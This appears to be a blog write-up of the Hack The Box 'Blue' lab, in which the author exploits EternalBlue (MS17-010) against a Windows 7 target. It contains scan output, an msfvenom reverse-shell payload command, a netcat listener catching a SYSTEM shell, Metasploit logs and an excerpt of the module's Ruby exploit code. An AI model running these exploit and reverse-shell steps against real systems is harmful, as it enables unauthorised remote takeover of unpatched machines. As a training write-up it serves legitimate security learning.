---
layout: post
title: "HTB: Blue"
image: ''
date:   2021-09-30 12:00:00
tags:
- beginner
- windows
- hackthebox
- red-team
- ms17-010
description: ''
categories:
published: false
comments: false
---

![intro](https://an00brektn.github.io/img/htb-blue/Pasted image 20210905175327.png)

## Intro
Blue is arguably the easiest box on the entire HTB platform. Root blood went in ~2 minutes, and for good reason. As the name of the box suggests, the vulnerability that we'll be focusing on is EternalBlue, an exploit developed by the NSA and leaked by the ShadowBrokers in 2017. I'll leverage this exploit without Metasploit to basically instantly get SYSTEM privileges. While the exploitation isn't that long, in Beyond Root (I definitely ripped this idea from 0xdf), I'll look at the Metasploit module and (from an amateur's eyes) try and see what makes it so inconsistent as compared to the one I use.

## Recon
Always gotta **nmap** scan first.
```sh
kali@kali:~/ctf/htb/blue$ rustscan --ulimit 5000 10.10.10.40 -- -Pn -sC -sV -oN scans/initscan.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
Faster Nmap scanning with Rust.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/kali/.config/rustscan/config.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.10.40:135
Open 10.10.10.40:139
Open 10.10.10.40:445
[~] Starting Nmap
[>] The Nmap command to be run is nmap -Pn -sC -sV -oN scans/initscan.txt -vvv -p 135,139,445 10.10.10.40

PORT    STATE SERVICE      REASON  VERSION
135/tcp open  msrpc        syn-ack Microsoft Windows RPC
139/tcp open  netbios-ssn  syn-ack Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds syn-ack Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1m36s, deviation: 34m35s, median: 18m21s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 12457/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 12383/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 19006/udp): CLEAN (Timeout)
|   Check 4 (port 59712/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-09-06T00:19:24+01:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-05T23:19:20
|_  start_date: 2021-09-05T23:18:30
```

The easiest way to check for EternalBlue is to use nmap's `--script=vuln`, which will run all of the nse scripts tagged `vuln`.

```sh
kali@kali:~/ctf/htb/blue$ rustscan --ulimit 5000 10.10.10.40 -- -Pn --script=vuln
[you know what ports are open already]
Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
```

If you were in a real engagement/assessment, you might just want to leave it at that and tell your client that they're susceptible to this attack. EternalBlue can break a system if you spam it too much, but because this is a lab environment, we're okay.

## Setting up the Exploit

There are many versions of this exploit out there; the one I will use is is [helviojunior's](https://github.com/helviojunior/MS17-010), which is a fork of [worawit's repo](https://github.com/worawit/MS17-010). Another that I've seen be used is from [3ndG4me](https://github.com/3ndG4me/AutoBlue-MS17-010), but I don't like it as much.

The repository that I use comes with a `send_and_execute.py` which we can use to trigger an msfvenom payload. I'll clone the repository into my `/opt` directory.
```sh
kali@kali:/opt$ sudo git clone https://github.com/helviojunior/MS17-010
Cloning into 'MS17-010'...
remote: Enumerating objects: 202, done.
remote: Total 202 (delta 0), reused 0 (delta 0), pack-reused 202
Receiving objects: 100% (202/202), 118.50 KiB | 689.00 KiB/s, done.
Resolving deltas: 100% (115/115), done.
```

I'll also need to set up a virtual enviornment since the exploit is in python2. Once that's done, the exploit also depends on impacket, which I'll install in the environment, along with impacket's dependencies.

```sh
kali@kali:/opt/MS17-010$ sudo virtualenv blue -p $(which python2)
created virtual environment CPython2.7.18.final.0-64 in 438ms
  creator CPython2Posix(dest=/opt/MS17-010/blue, clear=False, no_vcs_ignore=False, global=False)
  seeder FromAppData(download=False, pip=bundle, setuptools=bundle, wheel=bundle, via=copy, app_data_dir=/root/.local/share/virtualenv)
    added seed packages: pip==20.3.4, pkg_resources==0.0.0, setuptools==44.1.1, wheel==0.34.2
  activators BashActivator,CShellActivator,FishActivator,PowerShellActivator,PythonActivator
kali@kali:/opt/MS17-010$ source blue/bin/activate
(blue) kali@kali:/opt/MS17-010$ pip install -r ../impacket/requirements.txt
[you don't want to see imports]
(blue) kali@kali:/opt/MS17-010$ cd ../impacket; sudo pip install .
[MORE IMPORTS]
```

Sometimes the exploit is finnicky and wants a non-empty credential, even though credentials aren't necessary most of the time.

```python
#!/usr/bin/python
from impacket import smb, smbconnection
from mysmb import MYSMB
from struct import pack, unpack, unpack_from
import sys
import socket
import time
import string
import random
import os.path

'''
MS17-010 exploit for Windows 2000 and later by sleepya

Note:
- The exploit should never crash a target (chance should be nearly 0%)
- The exploit use the bug same as eternalromance and eternalsynergy, so named pipe is needed

Tested on:
- Windows 2016 x64
- Windows 10 Pro Build 10240 x64
- Windows 2012 R2 x64
- Windows 8.1 x64
- Windows 2008 R2 SP1 x64
- Windows 7 SP1 x64
- Windows 2008 SP1 x64
- Windows 2003 R2 SP2 x64
- Windows XP SP2 x64
- Windows 8.1 x86
- Windows 7 SP1 x86
- Windows 2008 SP1 x86
- Windows 2003 SP2 x86
- Windows XP SP3 x86
- Windows 2000 SP4 x86
'''

USERNAME = 'An00bRektn'
PASSWORD = ''
[code review omitted because I'm lazy]
```

We're now ready to exploit.

## Shell as Administrator

I'll generate a msfvenom payload as follows:
```bash
(blue) kali@kali:/opt/MS17-010$ sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.2 LPORT=443 -e x86/shikata_ga_nai -f exe -o reverse.exe
```

All we have to do now is set up a listener and run the script. If I'm not recieving a meterpreter shell, I like to prepend my netcat listener with `rlwrap` so I can use the arrow keys.
```sh
(blue) kali@kali:/opt/MS17-010$ sudo python send_and_execute.py 10.10.10.40 reverse.exe 
Trying to connect to 10.10.10.40:445
Target OS: Windows 7 Professional 7601 Service Pack 1
Using named pipe: browser
Target is 64 bit
Got frag size: 0x10
GROOM_POOL_SIZE: 0x5030
BRIDE_TRANS_SIZE: 0xfa0
CONNECTION: 0xfffffa80045d14a0
SESSION: 0xfffff8a004088de0
FLINK: 0xfffff8a008628088
InParam: 0xfffff8a00862215c
MID: 0x4103
success controlling groom transaction
modify trans1 struct for arbitrary read/write
make this SMB session to be SYSTEM
overwriting session security context
Sending file ZA56KT.exe...
Opening SVCManager on 10.10.10.40.....
Creating service DsRv.....
Starting service DsRv.....
The NETBIOS connection with the remote host timed out.
Removing service DsRv.....
ServiceExec Error on: 10.10.10.40
nca_s_proto_error
Done
```
And on the listener...
```shell
kali@kali:~/ctf/htb/blue$ sudo rlwrap nc -lvnp 443
[sudo] password for kali: 
listening on [any] 443 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.10.40] 49158
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

whoami
whoami
nt authority\system

C:\Windows\system32>
```

Now we can grab both flags.
```powershell
type C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\root.txt
ff548eb7************************
type C:\Users\haris\Desktop\user.txt
type C:\Users\haris\Desktop\user.txt
4c546aea************************
```

## Beyond Root
After a quick reset to make sure nothing goes wrong, I'm going to try using Metasploit now.
```sh
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST tun0
LHOST => tun0
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.10.40
RHOSTS => 10.10.10.40
```

After running `exploit`, this happens:
```sh
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit

[*] Started reverse TCP handler on 10.10.14.2:4444 
[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.10.40:445 - The target is vulnerable.
[*] 10.10.10.40:445 - Connecting to target for exploitation.
[+] 10.10.10.40:445 - Connection established for exploitation.
[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
[*] 10.10.10.40:445 - Starting non-paged pool grooming
[+] 10.10.10.40:445 - Sending SMBv2 buffers
[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.10.40:445 - Sending final SMBv2 buffers.
[*] 10.10.10.40:445 - Sending last fragment of exploit packet!
[*] 10.10.10.40:445 - Receiving response from exploit packet
[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.10.40:445 - Sending egg to corrupted connection.
[*] 10.10.10.40:445 - Triggering free of corrupted buffer.
[-] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] 10.10.10.40:445 - Connecting to target for exploitation.
[+] 10.10.10.40:445 - Connection established for exploitation.
[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.10.40:445 - Trying exploit with 17 Groom Allocations.
[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
[*] 10.10.10.40:445 - Starting non-paged pool grooming
[+] 10.10.10.40:445 - Sending SMBv2 buffers
[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.10.40:445 - Sending final SMBv2 buffers.
[*] 10.10.10.40:445 - Sending last fragment of exploit packet!
[*] 10.10.10.40:445 - Receiving response from exploit packet
[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.10.40:445 - Sending egg to corrupted connection.
[*] 10.10.10.40:445 - Triggering free of corrupted buffer.
[-] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] 10.10.10.40:445 - Connecting to target for exploitation.
[+] 10.10.10.40:445 - Connection established for exploitation.
[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.10.40:445 - Trying exploit with 22 Groom Allocations.
[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
[*] 10.10.10.40:445 - Starting non-paged pool grooming
[+] 10.10.10.40:445 - Sending SMBv2 buffers
[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.10.40:445 - Sending final SMBv2 buffers.
[*] 10.10.10.40:445 - Sending last fragment of exploit packet!
[*] 10.10.10.40:445 - Receiving response from exploit packet
[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.10.40:445 - Sending egg to corrupted connection.
[*] 10.10.10.40:445 - Triggering free of corrupted buffer.
[-] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] Exploit completed, but no session was created.
```

For anyone reading, if you would like to correct me here is what my options looked like before sending this payload:
```sh
msf6 exploit(windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         10.10.10.40      yes       The target host(s), range CIDR identifier, or hosts file with syntax '
                                             file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects
                                             Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target
                                             machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Wind
                                             ows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target mach
                                             ines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server
                                              2008 R2, Windows 7, Windows Embedded Standard 7 target machines.

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     tun0             yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Automatic Target
```

I am by no means an expert (don't know Ruby that well, and I certainly don't know kernel exploit developement), but we can definitely try and walkthrough the code and see what's up. You can find it in the official Metasploit repository [here](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/smb/ms17_010_eternalblue.rb).

Here is a description of the exploit from Metasploit:
```sh
This module is a port of the Equation Group ETERNALBLUE exploit, part of
the FuzzBunch toolkit released by Shadow Brokers.

There is a buffer overflow memmove operation in Srv!SrvOs2FeaToNt. The size
is calculated in Srv!SrvOs2FeaListSizeToNt, with mathematical error where a
DWORD is subtracted into a WORD. The kernel pool is groomed so that overflow
is well laid-out to overwrite an SMBv1 buffer. Actual RIP hijack is later
completed in srvnet!SrvNetWskReceiveComplete.

This exploit, like the original may not trigger 100% of the time, and should be
run continuously until triggered. It seems like the pool will get hot streaks
and need a cool down period before the shells rain in again.

The module will attempt to use Anonymous login, by default, to authenticate to perform the
exploit. If the user supplies credentials in the SMBUser, SMBPass, and SMBDomain options it will use
those instead.

On some systems, this module may cause system instability and crashes, such as a BSOD or
a reboot. This may be more likely with some payloads.
```

In summary, it's kind of a hybrid between a kernel pool exploit and just a good ol' buffer overflow. This [article](https://www.sentinelone.com/blog/eternalblue-nsa-developed-exploit-just-wont-die/) by SentinelOne describes the components of the exploit. All together, it leverages a series of unfortunate events across three separate bugs. The first bug is a miscalculation of memory allocation between two data structures, opening up for a buffer overflow attack. The buffer overflow is triggerable thanks to the second bug that has to do with handling the size of packets in the SMB protocol, and the third bug ensures that memory for the shellcode can be allocated.

Below is lines 1176-1287 from the Metasploit version:
```ruby
 def smb_eternalblue(process_name, grooms)
    begin
      # Step 0: pre-calculate what we can
      shellcode = make_kernel_user_payload(payload.encoded, process_name)
      payload_hdr_pkt = make_smb2_payload_headers_packet
      payload_body_pkt = make_smb2_payload_body_packet(shellcode)

      # Step 1: Connect to IPC$ share
      print_status('Connecting to target for exploitation.')
      client, tree, sock, os = smb1_anonymous_connect_ipc
    rescue RubySMB::Error::CommunicationError
      # Error handler in case SMBv1 disabled on target
      raise EternalBlueError, 'Could not make SMBv1 connection'
    else
      print_good('Connection established for exploitation.')

      if verify_target(os)
        print_good('Target OS selected valid for OS indicated by SMB reply')
      else
        print_warning('Target OS selected not valid for OS indicated by SMB reply')
        print_warning('Disable VerifyTarget option to proceed manually...')
        raise EternalBlueError, 'Unable to continue with improper OS Target.'
      end

      # cool buffer print no matter what, will be helpful when people post debug issues
      print_core_buffer(os)

      if verify_arch
        print_good('Target arch selected valid for arch indicated by DCE/RPC reply')
      else
        print_warning('Target arch selected not valid for arch indicated by DCE/RPC reply')
        print_warning('Disable VerifyArch option to proceed manually...')
        raise EternalBlueError, 'Unable to continue with improper OS Arch.'
      end

      print_status("Trying exploit with #{grooms} Groom Allocations.")

      # Step 2: Create a large SMB1 buffer
      print_status('Sending all but last fragment of exploit packet')
      smb1_large_buffer(client, tree, sock)

      # Step 3: Groom the pool with payload packets, and open/close SMB1 packets
      print_status('Starting non-paged pool grooming')

      # initialize_groom_threads(ip, port, payload, grooms)
      fhs_sock = smb1_free_hole(true)

      @groom_socks = []

      print_good('Sending SMBv2 buffers')
      smb2_grooms(grooms, payload_hdr_pkt)

      fhf_sock = smb1_free_hole(false)

      print_good('Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.')
      fhs_sock.shutdown

      print_status('Sending final SMBv2 buffers.') # 6x
      smb2_grooms(6, payload_hdr_pkt) # TODO: magic #

      fhf_sock.shutdown

      print_status('Sending last fragment of exploit packet!')
      final_exploit_pkt = make_smb1_trans2_exploit_packet(tree.id, client.user_id, :eb_trans2_exploit, 15)
      sock.put(final_exploit_pkt)

      print_status('Receiving response from exploit packet')
      code, _raw = smb1_get_response(sock)

      code_str = '0x' + code.to_i.to_s(16).upcase
      if code.nil?
        print_error('Did not receive a response from exploit packet')
      elsif code == 0xc000000d # STATUS_INVALID_PARAMETER (0xC000000D)
        print_good("ETERNALBLUE overwrite completed successfully (#{code_str})!")
      else
        print_warning("ETERNALBLUE overwrite returned unexpected status code (#{code_str})!")
      end

      # Step 4: Send the payload
      print_status('Sending egg to corrupted connection.')

      @groom_socks.each { |gsock| gsock.put(payload_body_pkt.first(2920)) }
      @groom_socks.each { |gsock| gsock.put(payload_body_pkt[2920..(4204 - 0x84)]) }

      print_status('Triggering free of corrupted buffer.')
      # tree disconnect
      # logoff and x
      # note: these aren't necessary, just close the sockets
      return true
    ensure
      abort_sockets
    end
  end
```

This is the main method that is running the exploit (looking at the Windows 7 and before version because the Windows 8 one is a little more complicated), and we can kind of see each step of the process here. We're crafting a malicious SMB packet to send to the IPC$ share, grooming the heap to increase the chances of landing the shell, and then attempting to trigger the payload from the corrupted connection itself.

I would try to dig deeper into each line so that we're not trying to work off of abstractions, but it would take me way longer than it should to *truly* understand the whole process. However, based on this, I have two theories as to why it might not work as consistently.

1. My Metasploit installation, although I haven't modified it since installing it, might have some issues.
2. Since the shellcode is being triggered through the connection, there's a good chance the grooming just fails. 

The Python script that I uses the exploit to upload and trigger a payload as SYSTEM. Since it's trying to execute a command over the connection rather than abuse the connection itself, I can only assume this is the reason Metasploit doesn't pop as consistently (assuming it's not an installation issue).

This is definitely a step up from doing simple stack-based buffer overflows, but, even if I may or may not have found the reason, taking a deeper dive into the code makes me appreciate the exploit more than I did as opposed to when I would just aim, point, shoot.